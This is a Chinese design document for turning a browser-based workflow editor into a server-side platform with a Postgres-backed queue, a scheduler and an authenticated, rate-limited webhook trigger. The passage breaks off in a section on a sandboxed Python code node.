# 服务端运行时改造方案

从「浏览器里的编辑器 + mock 引擎」变成「服务器上持久化运行的工作流平台」，
并新增 Webhook 触发器。

目标形态一句话：**前端退化成编辑器和观察者，执行完全发生在服务端。**
关掉浏览器，定时报表照常发；上游系统 POST 一下，流程照常跑。

---

## 0. 为什么 Webhook 不能单独做

先把依赖关系说清楚，免得按错误的顺序开工。

Webhook 的本质是「一个 HTTP 请求触发一次运行」。今天引擎跑在浏览器内存里
（[engine.ts](../src/lib/engine.ts)），流程存在 localStorage（[library.ts](../src/lib/library.ts)），
运行记录跟着页面一起消失。请求进来了没有任何东西能执行它。

同样的道理适用于**已经存在的定时触发器**：`trigger.schedule` 节点配得好好的，
[describeSchedule](../src/lib/schedule.ts) 会把它翻译成「每天 09:00」给用户看，
但**没有任何进程真的会在 09:00 跑它**。这是当前最大的功能空洞 —— 用户配了定时，
以为它会跑。

所以顺序是固定的：

```
持久化存储 → 服务端引擎 → 调度器（定时终于真的会跑）→ Webhook
```

Webhook 在最后，但前三步做完之后它只是一天的工作量。

---

## 1. 部署形态

单机 Docker Compose。内部工具，并发个位数，不需要 K8s。

```
                    ┌─────────────────────────────────────┐
   浏览器 ─────────▶ │ nginx :80                           │
                    │  /          → 前端静态文件            │
   上游系统 ────────▶ │  /api/      → api                   │
   (POST /hooks/..) │  /hooks/    → api                   │
                    └────────────┬────────────────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │ api (FastAPI, Python)   │  控制面 + 节点执行端点
                    │  /api/flows /runs ...   │  现有 /nodes/* 原样保留
                    │  /hooks/{token}         │
                    └────────────┬────────────┘
                                 │ 只经 Postgres 通信
                    ┌────────────▼────────────┐
                    │ worker (Node)           │  ← 复用 engine.ts
                    │  取 run → 跑 DAG        │  调 api 的 /nodes/* 执行节点
                    │  内嵌 scheduler         │
                    └────────────┬────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │ postgres                │  流程 / 运行 / 事件 / 队列
                    └─────────────────────────┘
```

**api 和 worker 之间不直接通信，只通过 Postgres。** 这样 worker 可以随时重启、
可以起多个、崩了也不会让 api 跟着挂。

### 1.1 引擎用什么语言写 —— 唯一一个需要拍板的架构决策

三个选项：

| 方案 | 代价 |
|---|---|
| A. Python 重写引擎 | 图遍历、表达式解析、校验规则**一套语义两份实现**，必然漂移 |
| B. Node worker 复用 `engine.ts` | 部署里多一个运行时 |
| C. 前端保留执行，服务端只存储 | 不成立 —— 关掉浏览器就不跑了 |

**选 B。** 理由是硬的：

1. `engine.ts` 现在只有两处浏览器依赖（`window.setTimeout`、`TextEncoder`），
   Node 里都有。`Edge` 是 type-only import。**搬过去几乎零改造。**
2. 表达式解析（`resolveTemplate` / `resolveExpr` / 过滤器）和校验（`validateNode`）
   **前端也必须跑** —— 编辑时的实时校验、变量提示、消息预览都靠它。
   写成 Python 就等于同一套语义维护两份，前端说「保存期就报错」、后端说「没问题」，
   或者反过来。这类 bug 排查成本极高，因为**两边单独测都是对的**。
3. 节点执行早就通过 HTTP 协议解耦了（`runtime.kind: http / http-async`），
   引擎用什么语言都能调 Python 那边的 `/nodes/*`。这个解耦是现成的红利。

代价只是 Compose 里多一个 `node:20` 容器。相比双实现漂移，便宜太多。

### 1.2 代码结构调整

```
src/lib/engine.ts          →  拆成两部分
  packages/engine-core/       纯逻辑：图遍历、表达式、过滤器、校验
                              零环境依赖，前后端共用，node --test 覆盖
  src/lib/mockHost.ts         浏览器宿主：mock 输出、setTimeout
  worker/liveHost.ts          worker 宿主：真实 HTTP 调用、事件落库
```

`engine-core` 用 npm workspace 或干脆 `tsconfig` paths 引一下就行，
不必发包。前端 `import` 它，worker 也 `import` 它。

> 顺带解决一个现存问题：`engine.ts` 里 `mockOutput` 和真实执行的分支缠在一起
> （`isLive(node)` 到处判断）。拆宿主之后这条判断就消失了 —— 浏览器只有 mock，
> worker 只有真实。

---

## 2. 数据模型

Postgres。JSONB 存流程定义 —— 定义的形状由 [types.ts](../src/types.ts) 的
`FlowDefinition` 决定，不要拆成关系表，那样每加一个字段就要迁移一次。

```sql
-- ─────────────────────────────────────────── 流程定义

CREATE TABLE flows (
  id           TEXT PRIMARY KEY,
  name         TEXT NOT NULL,
  -- 已发布的版本号。NULL = 只有草稿，从未发布
  -- 定时和 webhook 只触发这个版本，草稿改坏了不影响线上
  active_version INT,
  created_at   TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at   TIMESTAMPTZ NOT NULL DEFAULT now(),
  archived_at  TIMESTAMPTZ
);

-- 版本快照，**不可变**。发布后任何编辑都是新版本。
CREATE TABLE flow_versions (
  flow_id      TEXT NOT NULL REFERENCES flows(id) ON DELETE CASCADE,
  version      INT  NOT NULL,
  definition   JSONB NOT NULL,          -- 整个 FlowDefinition
  created_at   TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_by   TEXT,
  PRIMARY KEY (flow_id, version)
);

-- ─────────────────────────────────────────── 运行

CREATE TYPE run_status AS ENUM ('queued','running','success','error','canceled');

CREATE TABLE runs (
  id             TEXT PRIMARY KEY,
  flow_id        TEXT NOT NULL REFERENCES flows(id),
  -- 钉住当时那份定义。流程改了之后历史记录仍然解释得通 ——
  -- 不钉的话「这个节点当时为什么输出这个」永远查不明白
  flow_version   INT  NOT NULL,
  status         run_status NOT NULL DEFAULT 'queued',
  mode           TEXT NOT NULL,          -- manual | production
  trigger_kind   TEXT NOT NULL,          -- manual | schedule | webhook
  trigger_input  JSONB NOT NULL DEFAULT '{}',   -- 解析后的流程入参（$.trigger.*）
  trigger_meta   JSONB NOT NULL DEFAULT '{}',   -- webhook 的 headers/query/ip 等
  error          TEXT,
  created_at     TIMESTAMPTZ NOT NULL DEFAULT now(),
  run_after      TIMESTAMPTZ NOT NULL DEFAULT now(),  -- 延迟执行 / 重试退避
  started_at     TIMESTAMPTZ,
  finished_at    TIMESTAMPTZ,
  -- 租约：worker 认领后写入，心跳续期。过期由 reaper 回收
  lease_owner    TEXT,
  lease_expires  TIMESTAMPTZ,
  attempt        INT NOT NULL DEFAULT 0,
  -- 幂等：同 key 只产生一个 run（webhook 重投、上游重试）
  idempotency_key TEXT,
  FOREIGN KEY (flow_id, flow_version) REFERENCES flow_versions(flow_id, version)
);

CREATE UNIQUE INDEX ON runs (flow_id, idempotency_key)
  WHERE idempotency_key IS NOT NULL;
-- 队列扫描走这条
CREATE INDEX ON runs (status, run_after) WHERE status = 'queued';
CREATE INDEX ON runs (flow_id, created_at DESC);

-- ─────────────────────────────────────────── 事件日志（append-only）

CREATE TABLE run_events (
  run_id     TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,
  seq        INT  NOT NULL,
  ts         TIMESTAMPTZ NOT NULL DEFAULT now(),
  type       TEXT NOT NULL,
  node_id    TEXT,
  iteration  INT,
  payload    JSONB NOT NULL DEFAULT '{}',
  PRIMARY KEY (run_id, seq)
);

-- ─────────────────────────────────────────── 触发器

CREATE TABLE schedules (
  flow_id     TEXT PRIMARY KEY REFERENCES flows(id) ON DELETE CASCADE,
  cron        TEXT NOT NULL,         -- 五段式，daily/hourly/interval 也归一成 cron
  timezone    TEXT NOT NULL DEFAULT 'Asia/Shanghai',   -- IANA 名，不是偏移量
  enabled     BOOLEAN NOT NULL DEFAULT true,
  next_fire_at TIMESTAMPTZ NOT NULL,
  last_fire_at TIMESTAMPTZ
);
CREATE INDEX ON schedules (next_fire_at) WHERE enabled;

CREATE TABLE webhooks (
  id          TEXT PRIMARY KEY,
  flow_id     TEXT NOT NULL REFERENCES flows(id) ON DELETE CASCADE,
  node_id     TEXT NOT NULL,          -- 画布上那个 trigger.webhook 节点
  token       TEXT NOT NULL UNIQUE,   -- URL 里的不可猜路径段
  secret_hash TEXT,                   -- 认证用；明文只在创建/轮换时给用户看一次
  auth_mode   TEXT NOT NULL DEFAULT 'secret',   -- none | secret | hmac
  response_mode TEXT NOT NULL DEFAULT 'immediate',  -- immediate | lastNode
  enabled     BOOLEAN NOT NULL DEFAULT true,
  rate_limit_per_min INT NOT NULL DEFAULT 60,
  created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 投递记录。排查「上游说发了但没跑」时唯一的证据
CREATE TABLE webhook_deliveries (
  id          BIGSERIAL PRIMARY KEY,
  webhook_id  TEXT NOT NULL REFERENCES webhooks(id) ON DELETE CASCADE,
  run_id      TEXT REFERENCES runs(id),   -- 被拒绝时为 NULL
  received_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  remote_ip   INET,
  status_code INT NOT NULL,
  reject_reason TEXT,
  body_bytes  INT,
  body_digest TEXT      -- sha256 前 16 位。**不存 body 原文**，见 §5.5
);
CREATE INDEX ON webhook_deliveries (webhook_id, received_at DESC);
```

### 2.1 为什么 run 状态是事件日志而不是一个可变对象

现在 `FlowRun.steps` 是内存里的可变对象，`record()` 直接改它。搬到服务端后
这个模型撑不住，换成 append-only 的 `run_events`，当前状态由事件 fold 得出。

四个好处，每个都是刚需：

1. **崩溃恢复。** worker 挂了，新 worker 读事件就知道哪些节点已经跑完、输出是什么，
   从断点继续，而不是整条重跑。
2. **SSE 推送天然成立。** 前端订阅 `?fromSeq=N`，断线重连不丢事件、不重复。
   现在的 `onStep` / `onRunUpdate` 回调本来就是事件形状 —— **这个迁移比想象中便宜**。
3. **历史可回放。** 「昨天这条流程为什么发了空表格」可以逐事件看。
4. **写入不冲突。** 多个并发运行各写各的行，没有读-改-写竞争。

事件类型（够用即可，不要一开始就设计得太全）：

```
run.queued        { triggerKind, triggerInput }
run.started       { workerId, attempt }
run.finished      { status, error? }
node.started      { nodeId, iteration?, input }      ← input 已脱敏
node.progress     { nodeId, progress, handle }       ← http-async 的轮询进度
node.succeeded    { nodeId, iteration?, output }
node.failed       { nodeId, iteration?, error, willRetry, nextAttemptAt? }
node.skipped      { nodeId, reason }                 ← 分支未命中 / 上游失败
loop.iteration    { nodeId, index, item }
```

`payload` 里的 output 可能很大（SQL 结果集）。超过阈值（比如 256KB）转存对象存储、
事件里只留 `{$ref}` —— [types.ts](../src/types.ts) 的 `x-large` 字段就是为这个留的位置。
一期可以先用 Postgres 大字段 + 定期清理，不阻塞主线。

### 2.2 恢复语义：恢复到节点边界，不是指令边界

Temporal 那套 deterministic replay 有一堆约束（不能用 `Date.now()`、不能用随机数、
代码改了要 patch），因为它 replay 的是**用户写的命令式代码**。

**我们不需要那套。** 工作流在这里是数据（DAG + 参数），不是代码。恢复只需要：

```
读 run_events → fold 出 { nodeId → output } → 从"还没跑完的节点"继续
```

图遍历顺序由 DAG 决定，是确定的。这是 DAG-as-data 相比 code-as-workflow 的
一个实打实的便宜。

**但有一个必须处理的例外：`http-async` 节点。**

SQL 节点 submit 之后拿到 handle，然后轮询。如果 worker 在轮询中途崩了，
恢复时**必须拿 `node.progress` 事件里记的 handle 重新 attach 继续轮询，
绝不能重新 submit**。重新 submit 意味着数据平台上多跑一个 Hive 大查询 ——
白烧集群资源，而且第一个任务还在跑，没人会去取消它。

这条就是 `node.progress` 事件里带 `handle` 的全部理由。

---

## 3. 执行：队列、租约、重试

### 3.1 Postgres 当队列

不引 Redis / RabbitMQ。`SKIP LOCKED` 在这个规模下完全够用，还少一个要运维的组件。

```sql
UPDATE runs SET
  status = 'running',
  lease_owner = $worker_id,
  lease_expires = now() + interval '60 seconds',
  started_at = COALESCE(started_at, now()),
  attempt = attempt + 1
WHERE id = (
  SELECT id FROM runs
  WHERE status = 'queued' AND run_after <= now()
  ORDER BY run_after
  FOR UPDATE SKIP LOCKED
  LIMIT 1
)
RETURNING *;
```

worker 每 20 秒续租一次。一个 reaper（可以跑在 worker 内）扫 `lease_expires < now()`
且 `status='running'` 的 run：

- `attempt < 3` → 置回 `queued`，恢复执行（按 §2.2 的规则）
- 否则 → 置 `error`，写 `run.finished` 事件，原因写「worker 反复失联」

### 3.2 并发上限（不是可选项）

三层限制，缺一不可：

| 层级 | 默认 | 为什么 |
|---|---|---|
| worker 全局并发 run 数 | 4 | 保护 worker 自身内存 |
| 单流程并发 run 数 | 1 | 同一条日报流程被连点 5 次不该真的跑 5 遍。超出的排队或直接丢弃（可配） |
| `flow.foreach` 循环并发 | 1（串行）| 一个 500 行的结果集做 foreach，并行会直接打爆数据平台 |

第二条尤其重要，因为 webhook 让「被连点」从假设变成了日常。

### 3.3 重试终于要实现了

`RetryPolicy` 在 [types.ts:120](../src/types.ts) 定义了、[registry.ts:173](../src/registry.ts) 声明了，
**引擎里一行实现都没有**。搬到服务端时补上，抄 Temporal 的四要素：

```ts
interface RetryPolicy {
  maxAttempts: number
  initialMs: number
  backoffCoefficient: number    // 2 = 指数退避
  maximumIntervalMs: number     // 退避上限，防止退到几小时后
  nonRetryable: string[]        // ← 最关键的一项
}
```

`nonRetryable` 是重点：**SQL 语法错误重试 3 次纯属浪费，网关 502 才该重试。**
错误分类靠后端节点服务返回的 HTTP 状态 —— 你在 [main.py](../server/sql_service/main.py)
已经分得很清楚了（400 = 调用方的问题、502/503 = 上游/凭证的问题），
引擎按这个分类决定重不重试：

- `4xx`（除 429）→ 不重试，直接失败
- `429 / 5xx / 网络错误 / 超时` → 重试

### 3.4 幂等键：把重试从危险功能变成安全功能

`policy.idempotent` 字段声明了但没人用。有副作用的节点（`notify.wecom`、
写类型的 `http.request`）必须做：

```
idempotency_key = sha256(run_id + node_id + iteration)
```

worker 调 `/nodes/notify.wecom/execute` 时带上 `Idempotency-Key` 头，
服务端记 24 小时，同 key 直接返回上次结果不重发。

没有这个，「重试」和「崩溃恢复」两个功能都会变成「用户群里收到三条一样的日报」。

---

## 4. API 设计

现有的 `/nodes/*`、`/registry/nodes`、`/options/*`、`/health` 原样保留 ——
它们是**节点执行面**，被 worker 调用。新增的是**控制面**。

```
# 流程
GET    /api/flows                    列表（首页「最近编辑」）
POST   /api/flows                    新建
GET    /api/flows/{id}               取当前草稿
PUT    /api/flows/{id}               存草稿（编辑器防抖自动调）
POST   /api/flows/{id}/publish       草稿 → 新版本 → 设为 active
GET    /api/flows/{id}/versions      版本列表
DELETE /api/flows/{id}               归档

# 运行
POST   /api/flows/{id}/runs          手动发起。body: { inputs, mode }
GET    /api/runs?flowId=&status=     运行历史（分页）
GET    /api/runs/{id}                单次运行完整状态（fold 后的 FlowRun）
GET    /api/runs/{id}/events         SSE 实时事件流，?fromSeq=N 断点续订
POST   /api/runs/{id}/cancel         中止（worker 收到后 cancel 掉 http-async 任务）

# 触发器
GET    /api/flows/{id}/webhook       取 URL、状态、最近投递
POST   /api/flows/{id}/webhook/rotate  轮换 token/secret
POST   /api/flows/{id}/webhook/test    进入「监听一次」模式，见 §5.6
PUT    /api/flows/{id}/schedule      设定时（发布时自动同步）

# Webhook 入口（不在 /api 下 —— 认证方式完全不同）
POST   /hooks/{token}
```

### 4.1 前端改造：从执行者到观察者

[store.ts](../src/store.ts) 的 `startRun` 现在直接调 `executeFlow`。改成：

```ts
startRun: async (inputs) => {
  const { runId } = await api.post(`/api/flows/${flowId}/runs`, { inputs, mode: 'manual' })
  const es = new EventSource(`/api/runs/${runId}/events`)
  es.onmessage = (e) => set(foldEvent(get().run, JSON.parse(e.data)))
}
```

**UI 组件一行不用改。** `foldEvent` 产出的仍然是现有的 `FlowRun` 形状，
RunPanel / FlowNodeView / NodeDetailView 读的还是同一个东西。
这是把 `record()` 设计成事件形状换来的红利。

浏览器里的 mock 引擎**保留**，用途转为：后端不可达时的离线预览、
以及编辑期的「这个表达式会算出什么」实时预览。[client.ts](../src/lib/client.ts)
的 `isOnline()` 退回逻辑不变，只是退回的粒度从「节点」变成「整个运行」。

---

## 5. Webhook 触发器

### 5.1 节点定义

在 [registry.ts](../src/registry.ts) 加第三个触发器（同时要在
[manifest.py](../server/sql_service/manifest.py) 补上，两边必须一致）：

```ts
{
  type: 'trigger.webhook',
  typeVersion: '1.0.0',
  name: 'Webhook 触发',
  category: '触发器',
  icon: '🔗',
  description: '外部系统 POST 一下就运行，body 里的字段自动当流程入参',
  hasInput: false,
  input: {
    type: 'object',
    required: ['authMode', 'responseMode'],
    properties: {
      authMode: {
        type: 'string', title: '认证方式', default: 'secret',
        enum: ['secret', 'hmac', 'none'],
        'x-ui': { widget: 'select', labels: {
          secret: '密钥请求头（推荐）',
          hmac:   'HMAC 签名（上游能算签名时用）',
          none:   '不认证（仅限内网可信调用方）',
        }},
      },
      responseMode: {
        type: 'string', title: '响应方式', default: 'immediate',
        enum: ['immediate', 'lastNode'],
        'x-ui': { widget: 'select', labels: {
          immediate: '立即返回 runId（推荐）',
          lastNode:  '等流程跑完，返回末节点输出',
        }},
      },
      responseTimeoutMs: {
        type: 'integer', title: '同步等待上限（毫秒）', default: 25000,
        maximum: 30000,
        description: '超时返回 504，但流程会继续跑完',
        'x-show': { responseMode: ['lastNode'] },
      },
      rateLimitPerMin: {
        type: 'integer', title: '每分钟最多触发', default: 60, minimum: 1,
      },
    },
  },
  output: {
    type: 'object',
    properties: {
      body:       { type: 'object', title: '请求体（原样）' },
      headers:    { type: 'object', title: '请求头', 'x-output-ui': { group: 'advanced' } },
      query:      { type: 'object', title: 'URL 查询参数' },
      remoteIp:   { type: 'string', title: '来源 IP',   'x-output-ui': { group: 'run' } },
      receivedAt: { type: 'string', title: '接收时间',  'x-output-ui': { group: 'run' } },
    },
  },
}
```

### 5.2 body → 流程入参：两条通道，互不冲突

这是整个 Webhook 设计里最需要想清楚的一处。

**通道一：`$.trigger.*` —— 按 `flowInputs` 同名从 body 顶层取（自动、带校验）**

流程入参已经是现成的概念：`FlowInputField[]` 定义了 key / title / type / required，
手动运行时渲染成表单。Webhook 触发时**从 body 顶层按 key 取同名字段**，
走同一套类型转换和必填校验。

```jsonc
// flowInputs: [{ key: 'vid', type: 'integer', required: true },
//              { key: 'days', type: 'integer', required: false }]

POST /hooks/wh_a3f9...
{ "vid": 12345, "days": 7 }

// → $.trigger.vid  = 12345
//   $.trigger.days = 7
```

**通道二：`$.nodes.<webhookNodeId>.output.body` —— 原始 body 全量**

body 是嵌套结构、或者字段名跟入参对不上时用它，配合表达式取值：
`{{ $.nodes.trigger1.output.body.data.userId }}`

**为什么两条都要：** 通道一让「同一条流程手动能调、定时能跑、webhook 能触发」
成立 —— 流程主体完全不需要知道自己被谁触发，这是最重要的性质。
通道二兜住通道一表达不了的情况。

**类型转换规则**（必须明确，否则会静默出错）：

| flowInput 类型 | body 里的值 | 结果 |
|---|---|---|
| `integer` | `7` / `"7"` | `7` |
| `integer` | `"abc"` / `7.5` | **400**，报文指明是哪个字段、期望什么 |
| `boolean` | `true` / `"true"` / `"1"` | `true` |
| `string` | `123` | `"123"` |
| required 字段缺失 | — | **400** |
| body 里有 flowInputs 里没有的字段 | — | 忽略（不报错，通道二仍能取到） |

校验逻辑复用 `engine-core` 里前端已有的那套 —— 又一个前后端共用 TS 的理由。
错误信息要能直接回给上游系统的开发者看：

```json
{ "error": "invalid_input",
  "detail": "入参 days 需要整数，收到 \"abc\"",
  "field": "days" }
```

### 5.3 URL 与认证

```
POST https://workflow.internal/hooks/wh_a3f9c2e1b7d4058f6a1c9e3b2d8f4a70
X-Webhook-Secret: <创建时给的密钥>
Content-Type: application/json
```

**路径 token 不是认证。** 它会进 nginx access log、进上游系统的配置文件、
可能进 Referer。它的作用只是「不可枚举」—— 防止有人遍历 `/hooks/1`、`/hooks/2`。
真正的认证是第二层：

- **`secret`（默认）**：`X-Webhook-Secret` 头，服务端存 hash，比较用
  `hmac.compare_digest` 常数时间比较（避免时序侧信道）。
- **`hmac`（上游能算签名时）**：
  `X-Signature: sha256=<hex>`，签名对象是 `timestamp + "." + raw_body`，
  另带 `X-Timestamp`。时间戳偏差超 5 分钟拒绝 —— **防重放**。
  注意必须对 **raw body** 算，不能对 parse 后再 serialize 的结果算，
  否则 key 顺序、空格差异都会导致签名对不上。
- **`none`**：只在调用方是内网可信服务时用。UI 上要给明确警告。

### 5.4 限流与保护 —— 别让 Webhook 成为打爆数据平台的入口

这是最容易被忽略、后果最严重的一节。**Webhook 意味着任何能 POST 的人都能
触发一条 Hive 大查询。**

| 保护 | 默认 | 超限行为 |
|---|---|---|
| body 大小 | 1 MB | `413`，且在**读取之前**就按 `Content-Length` 拒绝 |
| 单 webhook 频率 | 60 次/分 | `429` + `Retry-After` |
| 单流程并发 run | 1 | 排队；队列深度超 10 则 `429` |
| 只触发已发布版本 | — | 流程从未发布 → `409`，报文说「流程尚未发布」 |
| webhook 开关 | — | `enabled=false` → `404`（不是 403 —— 不泄露「这个 token 存在」）|

另外三条：

- Webhook 触发的 run 一律 `mode='production'` → **忽略 pinData**。
  [types.ts](../src/types.ts) 里已经写好了这条语义（「只在手动/调试运行时替代真实执行；
  生产触发忽略」），现在终于有地方兑现它。调试时钉住的假数据绝不能跑到生产触发上。
- token / secret 支持一键轮换，旧的立即失效。
- Webhook 节点的**参数变更不需要重新发布 token** —— token 挂在 flow 上不是 version 上，
  否则每次改流程上游都要改配置，没人受得了。

### 5.5 隐私：不要存 body 原文

body 里可能有用户 ID、手机号、业务数据。`webhook_deliveries` 只存
`body_bytes` + `body_digest`（sha256 前 16 位，用于判断「是不是重复投递」）。

nginx 的 access log 默认不记 body，保持默认，**不要为了排查方便打开它**。

真需要看 body 时走 `/api/runs/{id}` —— 那里有 run 的 `trigger_input`，
受权限控制，且经过 [secrets.ts](../src/lib/secrets.ts) 的 `redactNodeInput` 脱敏。
这跟 `notify.wecom` 输出里 webhook 地址要打码是同一条原则
（见 [wecom.py](../server/sql_service/wecom.py) 的注释）。

### 5.6 响应模式

**`immediate`（默认，强烈推荐）**

```
202 Accepted
{
  "runId": "run_lz3k9x",
  "status": "queued",
  "statusUrl": "/api/runs/run_lz3k9x"
}
```

理由跟 README 里「SQL 节点为什么必须异步」一模一样：Hive 慢查询跑几分钟，
同步等必然撞 nginx 的 `proxy_read_timeout`。Webhook 层要把这条理由重复一遍 ——
**上游系统的 HTTP 客户端也有超时**，而且通常比 nginx 还短。

**`lastNode`（同步）**

默认等待 300 秒，可配置 1–1800 秒，且必须小于 nginx 的 `proxy_read_timeout`。
超时返回 `202 + runId`，流程不会被取消，调用方可继续查询运行状态。
超时返回 `504`，但**流程继续在后台跑完**（不能因为调用方等不及就把已经提交的
查询扔了）。响应体是末节点的 output。

UI 上选这个模式时给明确提示：「流程里有 SQL 节点时不要用同步模式」。

**幂等**

接受 `Idempotency-Key` 请求头。同一个 webhook + 同一个 key，24 小时内返回
**同一个 runId**，不产生新运行。上游系统的重试机制（几乎所有 HTTP 客户端都有）
不会导致重复跑。这是 `runs` 表上那个 partial unique index 的用途。

### 5.7 前端配套（决定这个功能好不好用）

节点配置面板里必须有：

1. **完整 URL + 一键复制。** 用户不该自己拼。
2. **自动生成的 curl 示例**，body 按当前 `flowInputs` 填充示例值：

```bash
curl -X POST https://workflow.internal/hooks/wh_a3f9c2e1b7d4058f6a1c9e3b2d8f4a70 \
  -H 'X-Webhook-Secret: ••••••••' \
  -H 'Content-Type: application/json' \
  -d '{"vid": 12345, "days": 7}'
```

   `flowInputs` 一改，示例立刻跟着变 —— 跟 SQL 占位符那套「行从 SQL 里扫出来」
   是同一个思路：**不让用户手抄一遍**。

3. **「监听一次」测试模式**（抄 n8n 的 test webhook，非常值得）：
   点击后进入 60 秒监听窗口，前端 SSE 等着。上游真发一次请求过来，
   把 body 抓下来显示在面板里，并且可以**一键存成 pinData** ——
   之后调试整条流程都不用再麻烦上游发请求了。

   这个能力对「对接一个不熟悉的上游系统」的价值极高：你不需要先读它的文档
   猜 body 长什么样，让它发一次就知道了。

4. **最近投递记录**：时间、来源 IP、状态码、耗时、对应 runId。
   「上游说发了但没跑」是这类集成最常见的争议，没有这张表就说不清。

---

## 6. 定时触发器：让它真的会跑

现在 `trigger.schedule` 只是个显示层。补上调度器（跑在 worker 进程内，
用 Postgres advisory lock 保证多 worker 时只有一个在调度）：

```
每 30 秒：
  SELECT * FROM schedules WHERE enabled AND next_fire_at <= now() FOR UPDATE SKIP LOCKED
  → INSERT INTO runs (status='queued', trigger_kind='schedule', mode='production')
  → UPDATE next_fire_at = 下一次触发时间
```

三个必须明确的语义（都是踩过就知道疼的）：

**时区。** `at: "09:00"` 现在的描述是「服务器时区」。存 IANA 时区名
（`Asia/Shanghai`），不是 UTC 偏移 —— 偏移量在夏令时的地区是错的。
UI 上把时区显示出来，别让用户猜。

**misfire 策略（服务停了 3 小时，恢复后怎么办）。** 默认**跳过、只跑最近一次**。
补跑 6 次日报只会在群里刷屏。这个策略要写进 `schedules` 表（`misfire: skip | fire_once`），
但默认必须是 skip。

**四种模式归一成 cron。** `daily` / `hourly` / `interval` / `cron` 在存储层
统一成 cron 表达式，调度器只认一种。UI 层保留四种模式的友好配置
（[describeSchedule](../src/lib/schedule.ts) 那套人话描述继续用）——
**存储归一、展示友好**，这样调度器不用为四种模式各写一份下次触发时间的计算。

---

## 7. 部署

### docker-compose.yml 骨架

```yaml
services:
  postgres:
    image: postgres:16
    environment: { POSTGRES_DB: workflow, POSTGRES_PASSWORD_FILE: /run/secrets/pg }
    volumes: [pgdata:/var/lib/postgresql/data]
    healthcheck: { test: ["CMD-SHELL", "pg_isready -U postgres"], interval: 10s }

  api:
    build: ./server
    env_file: [./deploy/api.env]        # OAUTH_* 等凭证
    depends_on: { postgres: { condition: service_healthy } }
    command: uvicorn sql_service.main:app --host 0.0.0.0 --port 8791

  worker:
    build: ./worker
    env_file: [./deploy/worker.env]
    depends_on: { postgres: { condition: service_healthy } }
    deploy: { replicas: 1 }             # 起 2 个也安全（租约 + SKIP LOCKED）

  nginx:
    image: nginx:alpine
    ports: ["80:80"]
    volumes:
      - ./dist:/usr/share/nginx/html:ro          # vite build 产物
      - ./deploy/nginx.conf:/etc/nginx/conf.d/default.conf:ro
    depends_on: [api]

volumes: { pgdata: }
```

### nginx 要点

```nginx
location /api/  { proxy_pass http://api:8791/; proxy_read_timeout 60s; }

location /hooks/ {
  proxy_pass http://api:8791/hooks/;
  client_max_body_size 1m;      # 和 §5.4 的限制对齐
  proxy_read_timeout 1810s;     # > responseTimeoutSeconds 上限 1800s
}

location / { try_files $uri /index.html; }   # SPA 回退
```

同源反代之后 **CORS 可以关掉** —— [main.py](../server/sql_service/main.py)
里的 `CORS_ORIGINS` 在生产环境留空即可（代码里已经支持了）。

### 其他

- **凭证**：`server/.env` 那套继续用，但通过 `env_file` 挂进去，
  **绝不 COPY 进镜像**。README 里「凭证只有一个来源：机器人账号，
  绝不接受调用方传入」这条原则在服务端更重要 —— 现在有 Webhook 了，
  「调用方」变成了任意能 POST 的人。
- **备份**：`pg_dump` 每日 cron。流程定义是用户的心血，运行记录可以丢，定义不能。
- **数据保留**：`run_events` 会长得很快。90 天以上的运行记录归档或删除，
  但 `runs` 主记录保留（只删事件明细）。
- **HTTPS**：Webhook 带密钥，明文 HTTP 等于密钥裸奔。内网也要上 TLS。

---

## 8. 里程碑

每个里程碑结束时系统都是可用的，不存在「做到一半用不了」的阶段。

| # | 内容 | 交付后的变化 | 估算 |
|---|---|---|---|
| **M0** | Postgres + flows/versions 表；前端 localStorage → API；发布/版本概念 | 流程存服务器了，多人能看到同一份 | 2-3 天 |
| **M1** | `engine-core` 拆分；Node worker；`run_events`；队列 + 租约；SSE | **关掉浏览器流程照跑**，运行历史查得到 | 4-6 天 |
| **M2** | 调度器 + 时区 + misfire | **定时触发终于真的会跑**（现在是空的） | 1-2 天 |
| **M3** | Webhook 触发器全套（§5） | 上游系统能 POST 触发 | 2-3 天 |
| **M4** | Python 代码节点 + 沙箱（§10） | 复杂数据加工不用在 SQL 里硬凑 | 3-4 天 |
| **M5** | 重试 + 幂等键 + 三层并发上限 | 慢 SQL 和网关抖动不再变成失败 | 2 天 |
| **M6** | 部署编排、备份、保留策略、HTTPS | 可以交给别人用了 | 1-2 天 |

逐条可勾选的执行清单见 [roadmap.md](./roadmap.md)。

**M0 + M1 是不可绕过的前置。** 如果目标是「尽快让 Webhook 能用」，
也必须先做这两步 —— 没有服务端执行，Webhook 触发了没人跑。

后续（不在本方案范围）：凭证管理层、子流程复用、等待/人工审批节点、
表达式换 CEL、拓扑同层并行执行。

---

## 9. 已知风险

| 风险 | 应对 |
|---|---|
| 崩溃恢复时 `http-async` 节点被重新 submit，数据平台上多跑一个大查询 | 恢复必须 re-attach `node.progress` 事件里的 handle（§2.2）|
| Webhook 被滥用打爆数据平台 | 三层限流 + 单流程并发上限（§5.4）|
| 引擎语义前后端漂移 | 选 Node worker 共用 `engine-core`，不写第二份实现（§1.1）|
| 重试导致企微群收到重复消息 | 幂等键（§3.4），先于重试功能上线 |
| 定时任务在服务重启后补跑刷屏 | misfire 默认 skip（§6）|
| `run_events` 无限增长 | 90 天保留策略 + 大 output 外部化（§2.1）|
| 同步 Webhook 撞 nginx 超时 | lastNode 默认 300s、上限 1800s，nginx 超时更长（§5.6）|
| 代码节点泄露服务端凭证 / 被 body 注入 | 独立沙箱容器 + 干净环境变量 + **代码字段禁止模板插值**（§10）|

---

## 10. 代码执行节点（`code.python`）

> **2026-08-28 实施修订**（拍板记录，正文保留原案不改写 —— 差异以这里为准）：
>
> - **§10.5 联网放开**：用户代码可以直接联网，`--network=none` 取消。代价照实：
>   http.request 的出网白名单与"URL/凭证可审计"对本节点不成立，兜底是内部
>   工具 + SSO + owner 可追溯。因此"环境变量绝不继承"升级为与 §10.1 并列的红线。
> - **代码上限 64KB → 1MB**。
> - **预装包清单进库**（`sandbox_packages` 表 + 管理员「Python 依赖」页增删，
>   版本仍钉死），不再是写死的四件套；种子加了 `requests`。仍不支持用户自装。
> - **沙箱容器已做，nsjail 未上**（deploy/sandbox.Dockerfile + compose 的
>   sandbox 服务）：容器边界先行 —— 无凭证、独立网络（摸不到 postgres）、
